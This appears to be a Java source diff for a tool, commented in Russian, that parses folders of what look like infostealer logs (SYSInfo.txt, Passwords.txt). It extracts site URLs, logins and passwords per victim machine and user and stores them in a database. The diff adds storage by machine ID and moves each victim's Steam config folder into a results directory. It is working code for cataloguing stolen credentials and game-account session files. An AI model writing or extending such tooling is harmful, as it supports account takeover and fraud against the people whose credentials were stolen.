@@ -1,4 +1,8 @@
 import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -17,9 +21,7 @@ class Manager {
     private String appName;
     private String login;
     private String pass;
-    private String user;
     private int count = 0;
-
 
     Manager() {
         arrayLogPasses = new HashMap<>();
@@ -27,7 +29,6 @@ class Manager {
         appName = "";
         login   = "";
         pass    = "";
-        user    = "";
     }
 
     public int getCount() {
@@ -43,17 +44,8 @@ class Manager {
         StringBuilder s = new StringBuilder();
         if (file.isFile()){
             if (file.getName().equals("SYSInfo.txt")){
-                String compUser = findUserCompName(file);
                 for (Map.Entry<String, ArrayList<LogPass>> entry: arrayLogPasses.entrySet()){
-//                    s.append("\r\n"+entry.getKey());
-//                    for (LogPass logPass:entry.getValue()) {
-//                        s.append("\r\nComp(User): " +logPass.getUrl());
-//                        s.append("\r\nLogin: "      +logPass.getLogin());
-//                        s.append("\r\nPassword: "   +logPass.getPassword());
-//                        s.append("\r\n=================================");
-//                    }
-                    //s.append("*****************************************");
-                    writResult(entry.getKey(),entry.getValue(),compUser);
+                      writResultToDB(entry.getKey(),entry.getValue(),findUserCompName(file),findMachineID(file));
                 }
             }else if (file.getName().equals("Passwords.txt")){
                 // Обработать файл
@@ -96,7 +88,7 @@ class Manager {
     /**
      * Запишим рещультат в файл
      */
-    private void writResult(String urlPath, ArrayList<LogPass> logPasses, String compUser){
+    private void writResultToFile(String urlPath, ArrayList<LogPass> logPasses, String compUser, String machineID){
         String fileWrite;
         String[] domains = {".com",
                             ".net",
@@ -111,7 +103,6 @@ class Manager {
                 break;
             }
         }
-
         newSrt          = newSrt.replace("http://", "");
         newSrt          = newSrt.replace("pop3://", "");
         newSrt          = newSrt.replace("https://","");
@@ -135,6 +126,7 @@ class Manager {
             }
             for (LogPass pass:logPasses) {
                 pass.setUser(compUser);
+                pass.setMachineID(machineID);
                 String str = "\r\nURL:"    + pass.getUrl() +
                         "\r\nComp(User): "  + compUser +
                         "\r\nLogin: "       + pass.getLogin() +
@@ -152,6 +144,24 @@ class Manager {
 
     }
 
+    /**
+     * Запишим рещультат в базу данных
+     */
+    private void writResultToDB(String urlPath, ArrayList<LogPass> logPasses, String compUser, String machineID){
+
+        DbHandler handler = null;
+        try {
+            handler = DbHandler.getInstance();
+            for (LogPass pass:logPasses) {
+                pass.setMachineID(machineID);
+                pass.setUser(compUser);
+                handler.addLogPass(pass);
+            }
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+
+    }
     /**
      * Обработать файл
      * @param file - файл для анализа
@@ -187,6 +197,13 @@ class Manager {
             for (String path: files) {
                 processData(file +"\\"+path);
             }
+
+            try {
+                copyDir(file.getAbsolutePath()+"\\Steam\\Config",getDirResult()+"\\Steam\\"+file.getName());
+            } catch (IOException e) {
+                e.printStackTrace();
+                System.out.println("Не пишет Steam");
+            }
             deleteDirectory(file);
         }
         else {
@@ -198,6 +215,14 @@ class Manager {
 
     }
 
+    private String findMachineID(File file) {
+        String machineID = "";
+        int index = file.getParent().lastIndexOf("\\");
+        if (index != -1) {
+            machineID = file.getParent().substring(index+1);
+        }
+        return machineID;
+    }
     /**
      * Deletes directory with subdirs and subfolders
      * @author Cloud
@@ -246,11 +271,29 @@ class Manager {
         }
     }
 
-    public String getUrl() {
+    // Копирование Steam файлов
+    private void copyDir(String sourceDirName, String targetSourceDir) throws IOException {
+        File folder = new File(sourceDirName);
+        File[] listOfFiles = folder.listFiles();
+
+        if (listOfFiles.length > 0) {
+            File newFolder = new File(getDirResult()+"\\Steam");
+            if (!newFolder.exists()) {
+                newFolder.mkdir();
+            }
+            Path pathSource = Paths.get(sourceDirName);
+            Path pathDestination = Paths.get(targetSourceDir);
+            Files.move(pathSource, pathDestination, StandardCopyOption.REPLACE_EXISTING);
+        }
+    }
+
+
+
+    private String getUrl() {
         return url;
     }
 
-    public void setUrl(String url) {
+    private void setUrl(String url) {
         this.url = url;
     }
 
@@ -258,23 +301,23 @@ class Manager {
         return appName;
     }
 
-    public void setAppName(String appName) {
+    private void setAppName(String appName) {
         this.appName = appName;
     }
 
-    public String getLogin() {
+    private String getLogin() {
         return login;
     }
 
-    public void setLogin(String login) {
+    private void setLogin(String login) {
         this.login = login;
     }
 
-    public String getPass() {
+    private String getPass() {
         return pass;
     }
 
-    public void setPass(String pass) {
+    private void setPass(String pass) {
         this.pass = pass;
     }
 
@@ -286,14 +329,13 @@ class Manager {
         return dirResult;
     }
 
-    public void setFilePath(String filePath) {
-
+    void setFilePath(String filePath) {
         this.filePath = filePath;
     }
-
-    public void setDirResult(String dirResult) {
+    void setDirResult(String dirResult) {
         this.dirResult = dirResult;
     }
+
 
     // Реализация интерфейса FileNameFilter
     class MyFileNameFilter implements FilenameFilter {
@@ -317,7 +359,6 @@ class Manager {
 
     // Реализация интерфейса FileNameFilter
     class MyDirFilter implements FilenameFilter {
-
         @Override
         public boolean accept(File dir, String name) {
             return dir.isDirectory();
